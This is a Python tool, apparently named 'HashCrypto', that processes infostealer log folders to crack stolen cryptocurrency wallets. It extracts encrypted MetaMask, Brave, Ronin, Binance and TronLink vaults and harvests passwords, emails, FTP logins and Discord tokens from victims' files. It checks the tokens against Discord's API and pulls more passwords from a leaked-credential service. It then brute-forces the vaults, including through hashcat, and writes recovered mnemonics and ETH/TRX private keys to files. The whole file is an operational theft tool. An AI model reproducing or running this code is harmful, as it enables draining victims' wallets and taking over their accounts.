from tkinter import filedialog
from tkinter import *

from hdwallet import HDWallet
from hashDecrypt import hdec
from urllib3.util import SKIP_HEADER
from requests import get, post
from datetime import datetime
from glob import glob

import subprocess # Для запуска хешкета.
import base64
import sqlite3
import hashlib
import pathlib # Поиск текстовиков и тд
import json
import ast # Нормализация забагованых json (которые не конвертируются)
import os
import time
import re


def findEncryptedData(path):
	with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
	regex = [
		r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}',
		r'{\\\"encrypted\\\":\\\"(.+?)\\\",\\\"nonce\\\":\\\"(.+?)\\\",\\\"kdf\\\":\\\"pbkdf2\\\",\\\"salt\\\":\\\"(.+?)\\\",\\\"iterations\\\":10000,\\\"digest\\\":\\\"sha256\\\"}', 
		r'{\\\"ct\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"s\\\":\\\"(.+?)\\\"}']
	
	for r in regex:
		matches = re.search(r, file, re.MULTILINE)
		if matches:
			data = matches.group(1)
			iv = matches.group(2)
			salt = matches.group(3)
			vault = {"data":data,"iv":iv,"salt":salt}
			return {"status":True, "data": vault}
	return {"status":False, "data": []}

def findSelectedAddress(path):
	with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
	match1 = re.search(r'"selectedAddress\":\"(.+?)\",\"', file, re.MULTILINE) # Brawe \ Metamask \ KardiaChain \ NiftyWallet \ cloverWallet \ monstraWallet
	match2 = re.search(r'selectedAccounth{"address":"(.+?)",', file, re.MULTILINE) # Ronin
	if match1:
		if len(match1.group(1)) > 42:
			result = (None)
		else:
			result = match1.group(1)
	elif match2:
		result = (match2.group(1))
	else:
		result = (None)
	return result

def findData(allTxt):
	
	def eValid(email):
		rawEmail = email.split("@")
		login = rawEmail[0]
		if len(login) > 4 and len(login) <= 20:
			return True
		else:
			return False
	
	def findDiscords(file):
		tokens = [token.strip() for token in file]
		for t in tokens:
			h =  {'Authorization': t}
			me = get("https://discordapp.com/api/v9/users/@me", headers=h)
			if me.status_code == 200:
				info = json.loads(me.text)
				return [info['username'], info["email"]]
			else:
				return None

	def findPassword(file):
		regex = [
			r"Username: (.*)\nPassword: (.*)", 
			r"USER: (.*)\nPASS: (.*)", 
			r"Login: (.*)\nPassword: (.*)",
			r"USER:		(.*)\nPASS:		(.*)"]
		
		regexEmail = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"  # r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" # r"\b([a-z0-9._-]+@[a-z0-9.-]+)\b"
		eList = []
		pList = []
		for regx in regex:
			matches = re.finditer(regx, file, re.MULTILINE)
			for item in matches:
				if item.group(1): # UserName
					email = re.match(regexEmail, item.group(1)) # ищем мыльники
					if email:
						eList.append(email[0])
					else:
						if item.group(1) != "UNKNOWN" and len(item.group(1)) < 40: # Логины юзернеймы.
							pList.append(item.group(1).strip())
				if item.group(2): # password
					if item.group(2) != "UNKNOWN" and len(item.group(2)) < 40:
						pList.append(item.group(2))
		return [eList, pList]

	def findUserinfo(file):
		regex = r"UserName: (.*)\n"
		un = re.search(regex, file, re.MULTILINE)
		if un:
			return un[1].strip()
		else:
			return None

	def findAutofils(file):
		regexEmails = r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
		eList = []
		match = re.findall(regexEmails, file, re.MULTILINE)
		for m in match:
			eList.append(m)
		return eList

	def findftpLines(file):
		regex = r"Server: (.*)\nUsername: (.*)\nPassword: (.*)"
		ftpList = []
		match = re.findall(regex, file, re.MULTILINE)
		for m in match:
			ftpList.append(m)
		return ftpList

	def antiPublick(part):
		d = "lines={}&limit=1000"
		t = "+".join(part)
		try:
			resp = post("https://antipublic.one/api/email_part_search.php?key=" + config["APIKEYAP"], data=d.format(t), headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": SKIP_HEADER}).json()
			result = []
			if resp["results"]:
				for item in resp["results"]:
					pssw = item.split(":")[1]
					result.append(pssw)
			return result
		except:
			return []

	pwdList = []
	emlList = []
	
	for txt in allTxt:
		if str(txt).find("Discord") != -1:
			with open(txt, "r", encoding="utf-8", errors="ignore") as f: file = f.readlines()
			itm = findDiscords(file)
			if itm:
				pwdList.append(itm[0])
				emlList.append(itm[1])
				# print("[findDiscords] add:", itm[0], itm[1])
		else:
			with open(txt, "r", encoding="utf-8", errors="ignore") as f: file = f.read()
			p = findPassword(file)
			u = findUserinfo(file)
			a = findAutofils(file)
			f = findftpLines(file)
			
			if p[0]: # ..................: Если есть почты наполняем массив.
				for itm in p[0]:
					if eValid(itm):
						emlList.append(itm)
					# print("[findPassword] add:", itm, end="\r")
			if p[1]: # ..................: Если есть пароли наполняем массив.
				for itm in p[1]:
					pwdList.append(itm)
					# print("[findPassword] add:", itm, end="\r")
			if u: # .....................: Если есть юзеринфо добавлям в  массив.
				pwdList.append(u)
				# print("[findUserinfo] add:", u, end="\r")
			if a: # .....................: Если есть почты в Autofils добавляем массив.
				for itm in a:
					if eValid(itm):
						emlList.append(itm)
					# print("[findAutofils] add:", itm, end="\r")
			if f: # .....................: Если есть пароли в фтп добавляем массив.
				for itm in f:
					pwdList.append(itm[1])
					pwdList.append(itm[2])
					# print("[findftpLines] add:", itm[1], itm[2], end="\r")

	for fnme in emlList:
		if fnme:
			cutLogin = fnme.partition('@')[0] # Обрезаем собаку с логина (почту)
			# print("[cutLogin] add", cutLogin, end="\r")
			pwdList.append(cutLogin) # ..........: Обрезать с мыльников логины и в пароли запихать.
	emlList = list(set(emlList)) #......: Удаление дубликатов мыльников.

	if config["ENABLEAP"]: # ...........: Если в конфиге включен антипаблик (премиум) то добавляем пароли с антипаблика.
		antipssw = antiPublick(emlList)
		pwdList = pwdList + antipssw
	pwdList = list(set(pwdList)) #......: Удаляем все дубликаты в паролях.

	return [pwdList, emlList]

def seedExplorer(result):
	try:
		if type(result) == int:
			return {"status": False, "data": result}
		
		elif len(result) == 0:
			return {"status": False, "data": result}
		
		elif type(result) == list: # Метамаск.
			
			if type(result[0]) != list:
				if "data" in result[0]:
					if "mnemonic" in result[0]["data"]:
						mnemonic = result[0]["data"]["mnemonic"]
						if type(mnemonic) is list:
							mnemonic = bytes(mnemonic).decode("utf-8")
						return {"status": True, "data": mnemonic}
					else:
						return {"status": False, "data": result}
				else:
					return {"status": False, "data": result}
			elif type(result[0]) == list:
				mnemonic = result[0][1]["mnemonic"]
				return {"status": True, "data": mnemonic}

			else:
				return {"status": False, "data": result}
		
		elif type(result) == str: # Ронин.
			raw = json.loads(result)
			if type(raw) != bool:
				mnemonic = raw["mnemonic"]
				return {"status": True, "data": mnemonic}
			else:
				return {"status": False, "data": result}
		
		elif type(result) == dict: # Binance + Tron
			if "version" in result: 
				if result["accounts"]:
					mnemonic = result["accounts"][0]['mnemonic'] 
					return {"status": True, "data": mnemonic}
				else:
					return {"status": False, "data": result}
			else:
				for address in result:
					if "mnemonic" in result[address]:
						mnemonic = result[address]["mnemonic"]
						return {"status": True, "data": mnemonic}
					else:
						# Сохранять в файл
						privKey = result[address]["privateKey"]
						address = result[address]["address"]
						saveLine = f"{address}:{privKey}"
						with open("tronSave.txt", "a", encoding="utf-8") as f: f.write(saveLine + "\n")
						return {"status": False, "data": result}
		
		else:
			return {"status": False, "data": result}
	except:
		return {"status": False, "data": result}

def getAddress(mnemonic, path):

    hdwallet = HDWallet(symbol=path[5], use_default_path=False)
    hdwallet.from_mnemonic(mnemonic)

    hdwallet.from_index(path[0], hardened=True)
    hdwallet.from_index(path[1], hardened=True)
    hdwallet.from_index(path[2], hardened=True)
    hdwallet.from_index(path[3])
    hdwallet.from_index(path[4])

    address = hdwallet.dumps()["addresses"]["p2pkh"] 
    private = hdwallet.dumps()["private_key"]

    # return json.dumps(hdwallet.dumps(), indent=4, ensure_ascii=False)
    return (path[5], address, private)

def typeWallet(path):
	if path.find('metamask') != -1:
		return "Metamask"
	elif path.find('bravewallet') != -1:
		return "BraweWallet"
	elif path.find('brave_brave') != -1:
		return "BraweWalletV2"
	elif path.find('ronin') != -1:
		return "Ronin"
	elif path.find('kardiachain') != -1:
		return "KardiaChain"
	elif path.find('niftywallet') != -1:
		return "NiftyWallet"
	elif path.find('cloverwallet') != -1:
		return "CloverWallet"
	elif path.find('monstrawallet') != -1:
		return "MonstraWallet"
	elif path.find('oasiswallet') != -1:
		return "OasisWallet"
	elif path.find('binancechain') != -1:
		return "BinanceChain"
	elif path.find('tronlink') != -1:
		return "TronLink"
	else:
		return "Unknown"

def identities(path):
	try:
		with open(path, "r", encoding="utf-8", errors="ignore") as f: file = f.read()
		regex = r"\"identities\":(.+?),\"infura"
		matches = re.search(regex, file, re.MULTILINE)
		obj = []
		if matches:
			out = ast.literal_eval(matches.group(1))
			# out = json.loads(matches.group(1))
			for item in out:
				address = out[item]["address"]
				name = out[item]["name"]
				timez = None
				if "lastSelected" in out[item]:
					lastSelected = out[item]["lastSelected"]
					timez = datetime.fromtimestamp(float(lastSelected)/1000).strftime('%d.%m.%Y')
				obj.append((address, name, timez))
			return {"status": True, "data": obj}
		else:
			return {"status": False, "data": obj}
	except:
		return {"status": False, "data": []}

def sqliAntiPub(hs):
	cur.execute("SELECT uid FROM antihash WHERE uid = ?", (hs, ))
	if cur.fetchone() is None:
		cur.execute("INSERT INTO antihash VALUES (?, ?, ?)", (None, hs, int(sTime)))
		con.commit()
		return {"status": True}
	else:
		return {"status": False}

def doWork(path):
	_path = path.lower() #..................................: Путь к лог файлу для поиcка
	vData = findEncryptedData(path) #.......................: [data, iv, salt]  
	pList = path.split("\\") #..............................: получаем лист из названия
	pToLog = os.path.join(pList[0], pList[1]) #.............: путь к логу.
	nLog = pList[1] #.......................................: Название папки с логом.
	wType = typeWallet(_path) #.............................: Определяем тип кошелька (мета, брав, ронин)

	if vData["status"]: #...................................: нашли данные для восстановления.
		payload = vData["data"] #...........................: json с data, iv , salt
		nhHs = hashlib.md5(str(payload).encode('utf-8')).hexdigest() # uid в md5 hash
		#====================================================
		if config["ENABLESD"]: # ...........................: Антипаблик [хешей].
			if sqliAntiPub(nhHs)["status"] == False: # если вернуло фалс значит дубликат.
				xhti =  "+--------------------+--------------------------------------------------------------------+\n"
				xhti += "| Status.............| [{}] Duplicate\n"
				xhti += "| Hash.id............| [{}]\n"
				xhti += "| Path...............| {}"
				print(xhti.format(wType, nhHs, path))
				return False
		#====================================================
		selectedAddress = findSelectedAddress(path) #.......: Ищем адресс для чека (основной)
		accName = identities(path) #........................: Ищем названия кошельков (трезор, леджер и т.д)
		tLog = list(pathlib.Path(pToLog).glob("**/*.txt"))#.: Ищем текстовики в конкретном логе
		#====================================================
		uData = findData(tLog) #............................: Находим пароли и почты.
		#====================================================
		if uData[0]: #......................................: Если нашли данные для Брута | (пароли и логины из почт)
			_checkPoint = 0
			for pssw in uData[0]: #....................: Начинаем перебор паролей.
				#====================================================
				if len(pssw) >= 8: # ..................: Проверка , что бы не брутить пароли меньше 8 символов.
					obj = vhash.decrypt(pssw, str(payload).replace("'", '"'))
				else:
					continue
				#====================================================
				if obj["status"]: #.....................: Если сбрутили пароль
					_checkPoint = 1 #...................: Меняем статус сбрутили пароль.
					# =====================================================================
					mnemonic = seedExplorer(obj["result"]) # Если с мнемоникой какая то херня то пропускаем кош.
					if mnemonic["status"] == False:
						continue
					# =====================================================================
					xEth = getAddress(mnemonic["data"], [44, 60, 0, 0, 0, "ETH"])
					xTrx = getAddress(mnemonic["data"], [44, 195, 0, 0, 0, "TRX"])
					eWallet, ePrivat = xEth[1], xEth[2]
					tWallet, tPrivat = xTrx[1], xTrx[2]
					# =====================================================================
					xOut =  "+--------------------+--------------------------------------------------------------------+\n"
					xOut += "| Status.............| [{}] Cracked\n"
					xOut += "| Mnemonic...........| {}\n"
					xOut += "| Password...........| {}\n"
					xOut += "| eth.Address........| {}\n"
					xOut += "| eth.Private........| {}\n"
					xOut += "| trx.Address........| {}\n"
					xOut += "| trx.Private........| {}\n"
					if accName["status"]:
						for itm in accName["data"]:
							itm = "{} | {} | {}".format(itm[0], itm[2], itm[1])
							xOut += f"| Account.info.......| {itm}\n"
					xOut += "| Path...............| {}\n"
					# =====================================================================
					xOutLog = xOut.format(wType, mnemonic["data"], pssw, eWallet, ePrivat, tWallet, tPrivat, path )
					print(xOutLog)
					# =====================================================================
					with open(os.path.join(saveResult, "xGood.txt"), "a", encoding="utf-8") as f: f.write(xOutLog)
					# =====================================================================
					break # Сбрасываем брут если чекпоинт 1. и переходим к следущему логу.
				else:
					pass # Пароль не сбрутили.

			if _checkPoint == 0: #.......................................: Статус брута пароля не изменился , значит пароль не сбрутился.
				#=======================================================================================================
				def checkInput():
					choice = input("Hashcode.............: (C)rack or (F)alse?: ")
					if choice == 'c'.lower():
						pssw = input("Enter pssw: ")
						obj = vhash.decrypt(pssw, str(payload).replace("'", '"'))
						mnemonic = seedExplorer(obj["result"])
						#==============================================
						print(f"[{wType}]:", mnemonic["data"])
						print("[Path]:", path)
						#==============================================
						with open("crack[e]d.txt", "a", encoding="utf-8") as f: f.write(mnemonic["data"] + "\n")
					elif choice == 'f':
						print("Ohh, no cracked, continue...")
					else:
						print("No Option selected, repeat...")
						checkInput()# ..................: Блок хешкета.
				# ----------------
				def hcatBrute():
					sh = "{}...{}".format(hashcat[:51], hashcat[-6:]) #.......................: Делаем вид как в hashcat
					hc =  "+--------------------+\n"
					hc += "| HashCat Bruteforce |\n"
					hc += "+--------------------+"
					print(hc)
					print(f"Uid.Hashcat..........: {nhHs}")
					with open(config["HSPATHHC"], "w", encoding="utf-8") as f: f.write(hashcat) #..........: Записываем хешкод для брута.
					print(f"Hash.code............: {sh}")
					with open(config["PWPATHHC"], "w", encoding="utf-8") as f:
						for pssw in uData[0]:
							f.write(pssw + "\n") #........................: Записываем пароли для брута.
					print(f"Hash.password........: {len(uData[0])} Passwords write") # ..................: Блок хешкета.
				#=======================================================================================================
				salt, iv, data = payload["salt"], payload["iv"], payload["data"]#.........: Получаем данные с найденного хеша.
				hashcat = f"$metamask${salt}${iv}${data}" #...............................: Переменная для хекшета.
				#=======================================================================================================
				if selectedAddress:
					#=======================================================================================================
					nPssw =  "+--------------------+--------------------------------------------------------------------+\n"
					nPssw += "| Status.............| [{}] Exception\n"
					nPssw += "| Address............| {}\n"
					if accName["status"]:
						for itm in accName["data"]:
							itm = "{} | {} | {}".format(itm[0], itm[2], itm[1])
							nPssw += f"| Account.info.......| {itm}\n"
					nPssw += "| Path...............| {}\n"
					#=======================================================================================================
					xBadpwd = nPssw.format(wType, selectedAddress, path )
					print(xBadpwd) # печатаем инфо на экран.
					#=======================================================================================================
					with open(os.path.join(saveResult, "xBadpwd.txt"), "a", encoding="utf-8") as f: f.write(xBadpwd)
					#=======================================================================================================
					if config["ENABLEHC"]:
						hcatBrute()
						chstart = input("Hashcat..............: (E)xit or ENTER to continue: ") #.........: еще один вопрос брутить или нет.
						if chstart != "e".lower():
							hcpath = config["HCEXEPTH"]
							cmd = f"cd {hcpath} && hashcat.exe -m 26600 -w 3 -a 0 -S hashcode.txt password.txt -r dive.rule"
							returned_value = subprocess.call(cmd, shell=True)  # returns the exit code in unix
							checkInput() # .........: Запускаем модуль HashCat, прогоняем пароли которые не взял наш софт.
					#=======================================================================================================
				else:
					#=======================================================================================================
					if config["ENABLEHC"]:
						hcatBrute()
						chstart = input("Hashcat..............: (E)xit or ENTER to continue: ") #.........: еще один вопрос брутить или нет.
						if chstart != "e".lower():
							hcpath = config["HCEXEPTH"]
							cmd = f"cd {hcpath} && hashcat.exe -m 26600 -w 3 -a 0 -S hashcode.txt password.txt -r dive.rule"
							returned_value = subprocess.call(cmd, shell=True)  # returns the exit code in unix
							checkInput() # .........: Запускаем хашкет, для хешей где нет адреса (не проверили баланс)
					else:
						pass
					#=======================================================================================================

		else:
			pass # Не нашли данные для брута( такое редко так как с лога вытягиваем максимально)
	else:
		# Сохраняем в файл те лог файлы в которых не нашли данные для восстановления для дальнейшего анализа.
		with open(os.path.join(saveResult, "xNFound.txt"), "a", encoding="utf-8") as f: f.write(f"[PATH]: {path}\n")



if __name__ == '__main__':
	# __init__
	root = Tk()
	root.withdraw()
	hashBaner = """
+------------+-----------------+
| HashCrypto | Public Software |
+------------+-----------------+
| Time: {}
| Path: {}
| Line: {}
+------------------------------+"""
	#=================================================================================================
	if os.path.exists('config.json'):
		with open('config.json', 'r') as f: config = json.load(f)	#........................: Подгружаем файл конфигурации.
	else:
		print("[ERROR]: file 'config.json' not found.")
		exit(1)
	#=================================================================================================
	sTime = datetime.timestamp(datetime.now())	#...................: Старт приложения, timestamp.
	runTime = datetime.fromtimestamp(sTime).strftime("%d.%m.%Y %H:%M:%S") # Время старта приложения.
	#=================================================================================================
	uPath = filedialog.askdirectory() #.............................: Вызываем окно выбора папки с логами.
	fLog = glob(os.path.join(uPath, "**\\*.log"), recursive=True) #.: Cбор путей к файлу с расширением log.
	tLen = len(fLog) #..............................................: Общее колличество найденных лог файлов.
	print(tLen, "lines.")
	#=================================================================================================
	saveResult = f"hSave[{int(sTime)}]"
	os.mkdir(saveResult) # .........................................: Папка с уникальным названием для сохранения результатов каждой сессии.
	#================================================================================================
	print(hashBaner.format(runTime, saveResult, tLen))
	#=================================================================================================
	vhash = hdec() # Иницилизируем декриптор.
	#=================================================================================================
	con = sqlite3.connect(config["SQLINAME"])
	cur = con.cursor()
	cur.execute("""CREATE TABLE IF NOT EXISTS antihash (
		"id" INTEGER,
		"uid" TEXT,
		"date" INTEGER,
		PRIMARY KEY("id")
		)""")
	con.commit()
	#=================================================================================================
	for path in fLog:
		try:
			doWork(path)
		except Exception as ex:
			eLine = f"[ERROR] Global: {ex}\n[PATH]: {path}"
			with open(os.path.join(saveResult, "xError.txt"), "a", encoding="utf-8") as f: f.write(eLine + "\n")
			print(eLine) 
			input("continue...")
			continue
	con.close()
	#=================================================================================================
	eTime = datetime.timestamp(datetime.now()) #....................: Конец выполнение приложения.
	normlTime = datetime.fromtimestamp(eTime) # ts.strftime("%d.%m.%Y %H:%M:%S") 25.01.2023 16:56:27
	totalTime = round(eTime - sTime, 2)
	endTime = normlTime.strftime("%d.%m.%Y %H:%M:%S")
	print(f"{totalTime} sec.\n{endTime}")
	input("Press ENTER to continue.")